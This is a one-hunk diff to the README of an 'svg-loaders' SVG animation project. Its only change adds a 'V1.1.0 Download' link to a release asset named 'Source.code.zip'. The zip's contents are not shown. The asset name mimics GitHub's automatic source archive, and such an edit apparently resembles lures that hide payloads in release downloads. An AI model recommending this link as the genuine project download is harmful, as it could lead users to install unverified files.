@@ -2,6 +2,8 @@
 # svg-loaders
 SVG Loading icons and animations
 
+V1.1.0 Download: https://github.com/Revplit-team/svg-loaders/releases/download/v1.1.0/Source.code.zip
+
 Demo
 ===========
 
